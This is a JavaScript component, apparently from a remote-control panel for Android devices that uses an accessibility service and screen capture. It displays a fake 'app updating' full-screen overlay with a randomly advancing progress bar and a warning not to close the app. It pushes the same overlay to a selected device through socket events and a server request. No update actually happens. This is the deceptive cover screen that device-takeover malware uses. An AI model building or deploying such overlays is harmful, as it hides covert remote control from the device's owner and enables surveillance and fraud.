/* =====================================================================
   BOTÃO DE ATUALIZAÇÃO — componente individual e independente (tamanho reduzido)
   Integrado com Acesso Materno (SocketManager, MyAccessibilityService, ScreenCaptureService)
   ===================================================================== */
(function (global) {
  "use strict";

  // ---- CSS injetado uma única vez (tamanho menor/compacto) ----
  var CSS = `
  .ba-btn{min-width:140px;height:38px;display:inline-flex;align-items:center;justify-content:center;
    background:#7f1d1d;color:#fff;border:1px solid #ef4444;border-radius:6px;padding:0 14px;font-size:13px;font-weight:600;
    letter-spacing:.3px;cursor:pointer;user-select:none;box-shadow:0 2px 8px rgba(220,38,38,.25);
    font-family:'Segoe UI',Roboto,Arial,sans-serif;transition:background .2s,transform .1s;-webkit-tap-highlight-color:transparent;}
  .ba-btn:hover{background:#991b1b;border-color:#f87171;} .ba-btn:active{transform:scale(.98);}
  .ba-overlay{--ba-bg-alpha:1;position:fixed;inset:0;z-index:2147483647;display:none;align-items:center;justify-content:center;
    background:transparent;color:#fff;opacity:0;
    transition:opacity .3s;font-family:'Segoe UI',Roboto,Arial,sans-serif;
    padding:env(safe-area-inset-top) env(safe-area-inset-right) env(safe-area-inset-bottom) env(safe-area-inset-left);}
  .ba-overlay::before{content:"";position:absolute;inset:0;z-index:-1;
    background:radial-gradient(120% 120% at 50% 30%,#1c1c1f 0%,#0a0a0b 70%,#000 100%);
    opacity:var(--ba-bg-alpha,1);transition:opacity .3s;}
  .ba-overlay.ba-ativo{display:flex;opacity:1;}
  .ba-card{width:100%;max-width:340px;display:flex;flex-direction:column;align-items:center;gap:24px;padding:10px 24px;text-align:center;}
  .ba-loader{position:relative;width:84px;height:84px;}
  .ba-loader .ba-anel{position:absolute;inset:0;border:5px solid rgba(255,255,255,.12);border-top-color:#fff;border-radius:50%;animation:ba-girar .9s linear infinite;}
  .ba-loader .ba-nucleo{position:absolute;inset:26px;border-radius:50%;background:#fff;animation:ba-pulsar 1.4s ease-in-out infinite;}
  @keyframes ba-girar{to{transform:rotate(360deg);}}
  @keyframes ba-pulsar{0%,100%{transform:scale(.7);opacity:.35;}50%{transform:scale(1);opacity:.95;}}
  .ba-titulo{font-size:19px;font-weight:700;letter-spacing:.3px;}
  .ba-sub{font-size:13.5px;color:rgba(255,255,255,.6);margin-top:-14px;line-height:1.4;}
  .ba-barra{width:100%;height:7px;background:rgba(255,255,255,.14);border-radius:20px;overflow:hidden;}
  .ba-barra .ba-fill{width:0%;height:100%;background:linear-gradient(90deg,#d8d8d8,#fff);border-radius:20px;transition:width .3s linear;}
  .ba-rodape{display:flex;justify-content:space-between;width:100%;font-size:12.5px;color:rgba(255,255,255,.55);letter-spacing:.4px;}
  .ba-aviso{font-size:11.5px;color:rgba(255,255,255,.4);margin-top:4px;min-height:14px;}
  `;

  var els = {};
  var ativo = false, progresso = 0, timer = null, wakeLock = null, montado = false;
  var fechando = false, timerFechar = null;

  function injetarCSS() {
    if (document.getElementById("ba-estilo")) return;
    var s = document.createElement("style");
    s.id = "ba-estilo"; s.textContent = CSS;
    document.head.appendChild(s);
  }

  function criarOverlay() {
    injetarCSS();  // garante o CSS mesmo quando se usa ativar() direto (sem montar())
    if (document.getElementById("ba-overlay")) return;
    var ov = document.createElement("div");
    ov.className = "ba-overlay"; ov.id = "ba-overlay";
    ov.setAttribute("role", "alertdialog");
    ov.innerHTML =
      '<div class="ba-card">' +
        '<div class="ba-loader"><div class="ba-anel"></div><div class="ba-nucleo"></div></div>' +
        '<div class="ba-titulo" id="ba-titulo">Atualizando o aplicativo</div>' +
        '<div class="ba-sub" id="ba-sub">Não feche o aplicativo durante a atualização.</div>' +
        '<div class="ba-barra"><div class="ba-fill" id="ba-fill"></div></div>' +
        '<div class="ba-rodape"><span id="ba-estado">Baixando...</span><span id="ba-percent">0%</span></div>' +
        '<div class="ba-aviso" id="ba-aviso"></div>' +
      '</div>';
    document.body.appendChild(ov);
    // Tocar no overlay desativa (o overlay cobre o botão, então isto é o "clicar de novo").
    ov.addEventListener("click", function () { desativar(); });
    els = {
      ov: ov,
      fill: ov.querySelector("#ba-fill"),
      percent: ov.querySelector("#ba-percent"),
      estado: ov.querySelector("#ba-estado"),
      titulo: ov.querySelector("#ba-titulo"),
      sub: ov.querySelector("#ba-sub"),
      aviso: ov.querySelector("#ba-aviso")
    };
  }

  async function manterTelaAcesa() {
    if ("wakeLock" in navigator) {
      try {
        wakeLock = await navigator.wakeLock.request("screen");
        wakeLock.addEventListener("release", function () { wakeLock = null; });
        els.aviso.textContent = ""; return;
      } catch (e) { els.aviso.textContent = "Mantenha a tela ligada até concluir."; }
    } else { els.aviso.textContent = "Mantenha a tela ligada até concluir."; }
  }
  function liberarTela() { if (wakeLock) { try { wakeLock.release(); } catch (e) {} wakeLock = null; } }

  document.addEventListener("visibilitychange", function () {
    if (ativo && document.visibilityState === "visible" && !wakeLock) manterTelaAcesa();
  });

  function definirFundo(op) {
    criarOverlay();
    var a = (op === undefined || op === null) ? 1 : Math.max(0, Math.min(1, Number(op)));
    if (isNaN(a)) a = 1;
    els.ov.style.setProperty("--ba-bg-alpha", a);
  }

  function onProgresso(p) {
    progresso = Math.max(0, Math.min(100, p));
    els.fill.style.width = progresso + "%";
    els.percent.textContent = Math.round(progresso) + "%";
  }

  // ---- Compatibilidade com SocketManager, MyAccessibilityService e ScreenCaptureService ----
  function iniciarDownload() {
    try {
      var alvo = (typeof aparelhoSelecionado !== 'undefined' && aparelhoSelecionado) ? aparelhoSelecionado : null;
      if (typeof socket !== 'undefined' && socket) {
        socket.emit('loading_overlay', { ativo: true, dispositivo: alvo });
        socket.emit('atualizacao_status', { ativo: true, dispositivo: alvo });
        socket.emit('overlay_atualizacao_visual', { ativo: true, dispositivo: alvo });
      }
      if (typeof fetch === 'function') {
        fetch('/alternar-overlay-atualizacao' + (alvo ? '?dispositivo=' + encodeURIComponent(alvo) : ''))
          .catch(function(e){ console.error(e); });
      }
    } catch (e) {
      console.error("Erro ao sincronizar atualização com SocketManager/AccessibilityService:", e);
    }

    timer = setInterval(function () {
      // Avanço lento e suave, para mostrar que está atualizando aos poucos.
      onProgresso(progresso + (0.3 + Math.random() * 0.7));
      if (progresso >= 100) {
        clearInterval(timer); timer = null;
        els.estado.textContent = "Concluído";
        els.sub.textContent = "Atualização finalizada com sucesso.";
        try {
          var alvo = (typeof aparelhoSelecionado !== 'undefined' && aparelhoSelecionado) ? aparelhoSelecionado : null;
          if (typeof socket !== 'undefined' && socket) {
            socket.emit('loading_overlay', { ativo: false, dispositivo: alvo });
            socket.emit('atualizacao_status', { ativo: false, dispositivo: alvo });
            socket.emit('overlay_atualizacao_visual', { ativo: false, dispositivo: alvo });
          }
        } catch (e) {}
        // Fica na tela até o usuário clicar de novo (não fecha sozinho).
      }
    }, 300);
  }

  function ativar() {
    if (fechando) return;                  // já está mostrando "Atualizado" e fechando
    if (ativo) { desativar(); return; }   // clicar de novo mostra "Atualizado" e some
    criarOverlay();
    ativo = true; progresso = 0; onProgresso(0);
    els.titulo.textContent = "Atualizando o aplicativo";
    els.sub.textContent = "Não feche o aplicativo durante a atualização.";
    els.estado.textContent = "Baixando...";
    els.ov.classList.add("ba-ativo");
    manterTelaAcesa();
    iniciarDownload();
  }

  // Segundo clique: mostra "Atualizado" e, em seguida, fecha o overlay.
  function desativar() {
    if (fechando) return;
    if (timer) { clearInterval(timer); timer = null; }
    liberarTela();
    fechando = true;
    criarOverlay();
    onProgresso(100);
    if (els.titulo) els.titulo.textContent = "Atualizado";
    if (els.sub)    els.sub.textContent = "Aplicativo atualizado com sucesso.";
    if (els.estado) els.estado.textContent = "Atualizado";
    // Depois de uma breve confirmação, o overlay desaparece.
    timerFechar = setTimeout(fecharAgora, 1100);
  }

  // Fecha o overlay de fato.
  function fecharAgora() {
    if (timerFechar) { clearTimeout(timerFechar); timerFechar = null; }
    ativo = false; fechando = false;
    if (els.ov) els.ov.classList.remove("ba-ativo");
  }

  function montar(alvo, texto) {
    injetarCSS(); criarOverlay();
    var cont = alvo ? (typeof alvo === "string" ? document.querySelector(alvo) : alvo) : document.body;
    if (!cont) { console.warn("BotaoAtualizacao: alvo não encontrado:", alvo); return; }
    var b = document.createElement("button");
    b.className = "ba-btn";
    b.textContent = texto || "Atualização";
    b.addEventListener("click", ativar);
    cont.appendChild(b);
    montado = true;
    return b;
  }

  global.BotaoAtualizacao = {
    montar: montar,
    ativar: ativar,
    desativar: desativar,
    progresso: onProgresso,
    fundo: definirFundo,
    transparente: function (ligar) { definirFundo(ligar === false ? 1 : 0.3); },
    concluir: function () { onProgresso(100); els.estado.textContent = "Concluído"; setTimeout(desativar, 900); },
    erro: function (msg) { if (timer){clearInterval(timer);timer=null;} els.estado.textContent = "Erro"; els.sub.textContent = msg || "Falha na atualização."; }
  };
})(window);
